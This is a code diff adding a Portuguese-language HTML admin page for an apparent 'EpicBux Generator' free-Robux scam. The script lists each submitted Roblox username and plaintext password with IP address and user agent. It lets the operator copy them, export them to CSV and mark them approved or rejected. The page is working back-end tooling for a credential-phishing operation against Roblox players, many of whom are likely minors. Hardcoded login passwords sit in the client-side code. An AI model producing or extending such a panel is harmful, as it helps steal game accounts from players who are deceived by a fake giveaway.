@@ -1,0 +1,1009 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel Admin - Roblox</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: adminBackgroundShift 12s ease-in-out infinite;
+        }
+
+        @keyframes adminBackgroundShift {
+            0%, 100% { background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); }
+            33% { background: linear-gradient(135deg, #2a5298 0%, #667eea 100%); }
+            66% { background: linear-gradient(135deg, #667eea 0%, #1e3c72 100%); }
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: loginFloat 8s ease-in-out infinite;
+        }
+
+        @keyframes loginFloat {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            25% { transform: translateY(-5px) rotate(0.5deg); }
+            50% { transform: translateY(-10px) rotate(-0.5deg); }
+            75% { transform: translateY(-5px) rotate(0.3deg); }
+        }
+
+        .admin-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #ff4b2b, #ff6b6b);
+            border-radius: 15px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            color: white;
+            font-weight: bold;
+            background-image: url('https://www.pngall.com/wp-content/uploads/2018/05/Epic-Face-PNG.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            background-color: transparent;
+            animation: adminLogoBounce 5s ease-in-out infinite;
+        }
+
+        @keyframes adminLogoBounce {
+            0%, 100% { transform: rotate(0deg) scale(1); }
+            25% { transform: rotate(10deg) scale(1.1); }
+            50% { transform: rotate(-10deg) scale(1.05); }
+            75% { transform: rotate(5deg) scale(1.08); }
+        }
+
+        .admin-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            gap: 15px;
+        }
+
+        .admin-site-name {
+            font-size: 28px;
+            font-weight: bold;
+            color: #2a5298;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+            animation: adminTitleGlow 4s ease-in-out infinite;
+        }
+
+        @keyframes adminTitleGlow {
+            0%, 100% { text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1); }
+            50% { text-shadow: 2px 2px 20px rgba(102, 126, 234, 0.6); }
+        }
+
+        h1 {
+            color: #2a5298;
+            font-size: 28px;
+            margin-bottom: 30px;
+            font-weight: bold;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: bold;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #2a5298;
+        }
+
+        .login-btn {
+            background: linear-gradient(45deg, #ff4b2b, #ff6b6b);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+            width: 100%;
+            animation: loginButtonPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes loginButtonPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+        }
+
+        .login-btn:hover {
+            transform: translateY(-3px) scale(1.05);
+            box-shadow: 0 15px 30px rgba(255, 75, 43, 0.4);
+            animation: none;
+        }
+
+        .admin-panel {
+            display: none;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            border-radius: 20px;
+            padding: 0;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 1400px;
+            width: 95%;
+            margin: 20px auto;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+        }
+
+        .header-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .header h1 {
+            color: white;
+            font-size: 32px;
+            margin: 0;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .content-wrapper {
+            padding: 30px;
+            background: white;
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        .stat-card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+            position: relative;
+            overflow: hidden;
+            animation: cardFloat 4s ease-in-out infinite;
+            animation-delay: calc(var(--card-index) * 0.3s);
+        }
+
+        @keyframes cardFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            animation: cardGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes cardGlow {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .stat-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            border-color: #667eea;
+        }
+
+        .stat-number {
+            font-size: 42px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: numberPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes numberPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .stat-label {
+            font-size: 16px;
+            color: #666;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .robux-counter {
+            background: linear-gradient(135deg, #00b300 0%, #008000 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 20px;
+            text-align: center;
+            margin-bottom: 40px;
+            font-size: 28px;
+            font-weight: bold;
+            box-shadow: 0 15px 35px rgba(0, 179, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .robux-counter::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .controls-section {
+            background: #f8f9fa;
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 30px;
+            border: 1px solid #e9ecef;
+        }
+
+        .controls-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .controls-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .filters {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            padding: 12px 24px;
+            border: 2px solid #e9ecef;
+            background: white;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+            color: #666;
+        }
+
+        .filter-btn:hover {
+            border-color: #667eea;
+            color: #667eea;
+            transform: translateY(-2px);
+        }
+
+        .filter-btn.active {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border-color: transparent;
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .export-btn {
+            background: linear-gradient(135deg, #28a745, #20c997);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
+        }
+
+        .export-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(40, 167, 69, 0.4);
+        }
+
+        .users-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            gap: 25px;
+        }
+
+        .user-card {
+            background: white;
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+            position: relative;
+            animation: userCardSlide 5s ease-in-out infinite;
+            animation-delay: calc(var(--user-index) * 0.2s);
+        }
+
+        @keyframes userCardSlide {
+            0%, 100% { transform: translateX(0px); }
+            25% { transform: translateX(-3px); }
+            75% { transform: translateX(3px); }
+        }
+
+        .user-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            border-radius: 20px 20px 0 0;
+        }
+
+        .user-card[data-status="pending"]::before {
+            background: linear-gradient(90deg, #ffc107, #ff9800);
+        }
+
+        .user-card[data-status="approved"]::before {
+            background: linear-gradient(90deg, #28a745, #20c997);
+        }
+
+        .user-card[data-status="rejected"]::before {
+            background: linear-gradient(90deg, #dc3545, #c82333);
+        }
+
+        .user-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+        }
+
+        .user-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #f8f9fa;
+        }
+
+        .user-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .user-info {
+            display: grid;
+            gap: 12px;
+        }
+
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            transition: background 0.3s;
+        }
+
+        .info-item:hover {
+            background: #e9ecef;
+        }
+
+        .info-label {
+            font-weight: 600;
+            color: #555;
+            font-size: 14px;
+        }
+
+        .info-value {
+            color: #333;
+            font-family: 'Courier New', monospace;
+            background: white;
+            padding: 5px 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            border: 1px solid #dee2e6;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 2px solid #f8f9fa;
+        }
+
+        .action-btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .action-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .copy-btn {
+            background: linear-gradient(135deg, #6c757d, #5a6268);
+            color: white;
+        }
+
+        .approve-btn {
+            background: linear-gradient(135deg, #28a745, #20c997);
+            color: white;
+        }
+
+        .reject-btn {
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            color: white;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #666;
+        }
+
+        .empty-state h3 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #999;
+        }
+
+        .empty-state p {
+            font-size: 16px;
+            color: #aaa;
+        }
+
+        .notification-badge {
+            background: linear-gradient(135deg, #ff4b2b, #ff6b6b);
+            color: white;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            margin-left: 15px;
+            animation: pulse 2s infinite;
+            box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4);
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4); }
+            50% { transform: scale(1.1); box-shadow: 0 8px 25px rgba(255, 75, 43, 0.6); }
+            100% { transform: scale(1); box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4); }
+        }
+
+        .logout-btn {
+            background: linear-gradient(135deg, #dc3545, #c82333);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(220, 53, 69, 0.3);
+        }
+
+        .logout-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(220, 53, 69, 0.4);
+        }
+
+        .user-card {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid #28a745;
+        }
+
+        .user-info {
+            margin-bottom: 15px;
+        }
+
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .info-label {
+            font-weight: bold;
+            color: #333;
+        }
+
+        .info-value {
+            color: #666;
+            font-family: monospace;
+            background: #f1f3f4;
+            padding: 5px 10px;
+            border-radius: 5px;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .action-btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: bold;
+            transition: transform 0.2s;
+        }
+
+        .action-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .copy-btn {
+            background: #6c757d;
+            color: white;
+        }
+
+        .approve-btn {
+            background: #28a745;
+            color: white;
+        }
+
+        .reject-btn {
+            background: #dc3545;
+            color: white;
+        }
+
+        .status {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+
+        .status-pending {
+            background: #ffc107;
+            color: #333;
+        }
+
+        .status-approved {
+            background: #28a745;
+            color: white;
+        }
+
+        .status-rejected {
+            background: #dc3545;
+            color: white;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Screen -->
+    <div class="login-container" id="loginScreen">
+        <div class="admin-header">
+            <div class="admin-logo"></div>
+            <div class="admin-site-name">EpicBux Generator</div>
+        </div>
+        <h1>Painel Administrativo</h1>
+        
+        <form id="adminLoginForm">
+            <div class="form-group">
+                <label for="senha">Senha Admin:</label>
+                <input type="password" id="senha" name="senha" required placeholder="Digite a senha">
+            </div>
+            
+            <button type="submit" class="login-btn">Entrar</button>
+            
+            <div class="error-message" id="errorMessage"></div>
+        </form>
+    </div>
+
+    <!-- Admin Panel -->
+    <div class="admin-panel" id="adminPanel">
+        <div class="header">
+            <div class="header-content">
+                <div class="header-left">
+                    <div class="admin-header">
+                        <div class="admin-logo"></div>
+                        <div class="admin-site-name">EpicBux Generator</div>
+                    </div>
+                    <h1>📊 Painel de Controle 
+                        <span class="notification-badge" id="pendingCount" style="display: none;">0</span>
+                    </h1>
+                </div>
+                <button class="logout-btn" onclick="logout()">🚪 Sair</button>
+            </div>
+        </div>
+
+        <div class="content-wrapper">
+            <!-- Dashboard Stats -->
+            <div class="dashboard">
+                <div class="stat-card" style="--card-index: 0;">
+                    <div class="stat-number" id="totalUsers">0</div>
+                    <div class="stat-label">👥 Total Usuários</div>
+                </div>
+                <div class="stat-card" style="--card-index: 1;">
+                    <div class="stat-number" id="pendingUsers">0</div>
+                    <div class="stat-label">⏳ Pendentes</div>
+                </div>
+                <div class="stat-card" style="--card-index: 2;">
+                    <div class="stat-number" id="approvedUsers">0</div>
+                    <div class="stat-label">✅ Aprovados</div>
+                </div>
+                <div class="stat-card" style="--card-index: 3;">
+                    <div class="stat-number" id="rejectedUsers">0</div>
+                    <div class="stat-label">❌ Reprovados</div>
+                </div>
+            </div>
+
+            <!-- Robux Counter -->
+            <div class="robux-counter">
+                💰 1382910 Robux faltando!
+            </div>
+
+            <!-- Controls Section -->
+            <div class="controls-section">
+                <div class="controls-header">
+                    <div class="controls-title">
+                        🔍 Controles de Visualização
+                    </div>
+                    <button class="export-btn" onclick="exportData()">📥 Exportar CSV</button>
+                </div>
+                <div class="filters">
+                    <button class="filter-btn active" onclick="filterUsers('all')">📋 Todos</button>
+                    <button class="filter-btn" onclick="filterUsers('pending')">⏳ Pendentes</button>
+                    <button class="filter-btn" onclick="filterUsers('approved')">✅ Aprovados</button>
+                    <button class="filter-btn" onclick="filterUsers('rejected')">❌ Reprovados</button>
+                </div>
+            </div>
+
+            <!-- Users Grid -->
+            <div class="users-grid" id="usersList">
+                <div class="empty-state">
+                    <h3>📭 Nenhuma solicitação encontrada</h3>
+                    <p>Aguardando novos usuários preencherem o formulário...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Armazenamento de dados (simulando banco de dados)
+        let usersData = JSON.parse(localStorage.getItem('robloxUsers')) || [];
+        let currentFilter = 'all';
+        
+        // Sistema de notificações
+        let notificationSound = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmGgU7k9n1unEiBC13yO/eizEIHWq+8+OWT');
+        
+        // Login do Admin
+        document.getElementById('adminLoginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const senha = document.getElementById('senha').value;
+            const errorMessage = document.getElementById('errorMessage');
+            
+            // Aceita qualquer uma das duas senhas
+            if (senha === 'Arthur' || senha === 'Luiz') {
+                // Login sucesso
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+                // Forçar recarga dos dados ao entrar
+                usersData = JSON.parse(localStorage.getItem('robloxUsers')) || [];
+                loadUsers();
+                updateDashboard();
+            } else {
+                // Login falhou
+                errorMessage.textContent = '❌ Senha incorreta!';
+                setTimeout(() => {
+                    errorMessage.textContent = '';
+                }, 3000);
+            }
+        });
+
+        // Logout
+        function logout() {
+            document.getElementById('loginScreen').style.display = 'flex';
+            document.getElementById('adminPanel').style.display = 'none';
+            document.getElementById('senha').value = '';
+        }
+
+        // Carregar usuários
+        function loadUsers() {
+            // Recarregar dados do localStorage a cada acesso
+            usersData = JSON.parse(localStorage.getItem('robloxUsers')) || [];
+            updateDashboard();
+            
+            const usersList = document.getElementById('usersList');
+            
+            // Filtrar usuários
+            let filteredUsers = usersData;
+            if (currentFilter !== 'all') {
+                filteredUsers = usersData.filter(user => user.status === currentFilter);
+            }
+            
+            if (filteredUsers.length === 0) {
+                usersList.innerHTML = `
+                    <div class="empty-state">
+                        <h3>📭 Nenhuma solicitação encontrada</h3>
+                        <p>Aguardando novos usuários preencherem o formulário...</p>
+                    </div>
+                `;
+                return;
+            }
+
+            usersList.innerHTML = filteredUsers.map((user, index) => {
+                const originalIndex = usersData.indexOf(user);
+                return `
+                    <div class="user-card" data-status="${user.status}" style="--user-index: ${index};">
+                        <div class="user-header">
+                            <div class="user-title">
+                                👤 Usuário #${originalIndex + 1}
+                                <span class="status status-${user.status}">${getStatusText(user.status)}</span>
+                            </div>
+                        </div>
+                        
+                        <div class="user-info">
+                            <div class="info-item">
+                                <span class="info-label">📝 Nome:</span>
+                                <span class="info-value">${user.nome}</span>
+                            </div>
+                            
+                            <div class="info-item">
+                                <span class="info-label">🔐 Senha:</span>
+                                <span class="info-value">${user.senha}</span>
+                            </div>
+                            
+                            <div class="info-item">
+                                <span class="info-label">📅 Data:</span>
+                                <span class="info-value">${user.data}</span>
+                            </div>
+                            
+                            <div class="info-item">
+                                <span class="info-label">⏰ Hora:</span>
+                                <span class="info-value">${user.hora}</span>
+                            </div>
+                            
+                            <div class="info-item">
+                                <span class="info-label">🌐 IP:</span>
+                                <span class="info-value">${user.ip}</span>
+                            </div>
+                            
+                            <div class="info-item">
+                                <span class="info-label">💰 Robux:</span>
+                                <span class="info-value">${user.robuxAmount || 1000} Robux</span>
+                            </div>
+                            
+                            <div class="info-item">
+                                <span class="info-label">📱 User Agent:</span>
+                                <span class="info-value" style="font-size: 12px;">${user.userAgent}</span>
+                            </div>
+                        </div>
+                        
+                        <div class="action-buttons">
+                            <button class="action-btn copy-btn" onclick="copyUserData(${originalIndex})">
+                                📋 Copiar
+                            </button>
+                            <button class="action-btn approve-btn" onclick="approveUser(${originalIndex})">
+                                ✅ Aprovar
+                            </button>
+                            <button class="action-btn reject-btn" onclick="rejectUser(${originalIndex})">
+                                ❌ Reprovar
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // Atualizar dashboard
+        function updateDashboard() {
+            const total = usersData.length;
+            const pending = usersData.filter(u => u.status === 'pending').length;
+            const approved = usersData.filter(u => u.status === 'approved').length;
+            const rejected = usersData.filter(u => u.status === 'rejected').length;
+            
+            document.getElementById('totalUsers').textContent = total;
+            document.getElementById('pendingUsers').textContent = pending;
+            document.getElementById('approvedUsers').textContent = approved;
+            document.getElementById('rejectedUsers').textContent = rejected;
+            
+            // Atualizar badge de notificação
+            const badge = document.getElementById('pendingCount');
+            if (pending > 0) {
+                badge.style.display = 'inline-flex';
+                badge.textContent = pending;
+                // Tocar som de notificação
+                try {
+                    notificationSound.play().catch(() => {});
+                } catch(e) {}
+            } else {
+                badge.style.display = 'none';
+            }
+            
+            // Calcular total de Robux aprovados
+            const totalRobuxApproved = usersData
+                .filter(u => u.status === 'approved')
+                .reduce((sum, user) => sum + (user.robuxAmount || 1000), 0);
+            
+            // Atualizar contador de Robux
+            const robuxRestantes = 1382910 - totalRobuxApproved;
+            document.querySelector('.robux-counter').innerHTML = `💰 ${robuxRestantes.toLocaleString('pt-BR')} Robux faltando!`;
+        }
+
+        // Filtrar usuários
+        function filterUsers(filter) {
+            currentFilter = filter;
+            
+            // Atualizar botões ativos
+            document.querySelectorAll('.filter-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            event.target.classList.add('active');
+            
+            loadUsers();
+        }
+
+        // Exportar dados
+        function exportData() {
+            let csv = 'Nome,Senha,Data,Hora,IP,Robux,User Agent,Status\n';
+            usersData.forEach(user => {
+                csv += `"${user.nome}","${user.senha}","${user.data}","${user.hora}","${user.ip}","${user.robuxAmount || 1000}","${user.userAgent}","${user.status}"\n`;
+            });
+            
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `roblox_users_${new Date().toISOString().split('T')[0]}.csv`;
+            a.click();
+        }
+
+        // Funções de ação
+        function copyUserData(index) {
+            const user = usersData[index];
+            const text = `Nome: ${user.nome}\nSenha: ${user.senha}\nData: ${user.data}\nHora: ${user.hora}\nIP: ${user.ip}\nRobux: ${user.robuxAmount || 1000}\nUser Agent: ${user.userAgent}`;
+            
+            navigator.clipboard.writeText(text).then(() => {
+                alert('📋 Dados copiados para a área de transferência!');
+            });
+        }
+
+        function approveUser(index) {
+            usersData[index].status = 'approved';
+            localStorage.setItem('robloxUsers', JSON.stringify(usersData));
+            loadUsers();
+            alert('✅ Usuário aprovado com sucesso!');
+        }
+
+        function rejectUser(index) {
+            usersData[index].status = 'rejected';
+            localStorage.setItem('robloxUsers', JSON.stringify(usersData));
+            loadUsers();
+            alert('❌ Usuário reprovado!');
+        }
+
+        // Auto-recarregar a cada 2 segundos
+        setInterval(() => {
+            if (document.getElementById('adminPanel').style.display !== 'none') {
+                loadUsers();
+            }
+        }, 2000);
+
+        // Recarregar ao focar na janela
+        window.addEventListener('focus', () => {
+            if (document.getElementById('adminPanel').style.display !== 'none') {
+                loadUsers();
+            }
+        });
+
+        function getStatusText(status) {
+            const statusMap = {
+                'pending': 'Pendente',
+                'approved': 'Aprovado',
+                'rejected': 'Reprovado'
+            };
+            return statusMap[status] || 'Pendente';
+        }
+    </script>
+</body>
+</html>
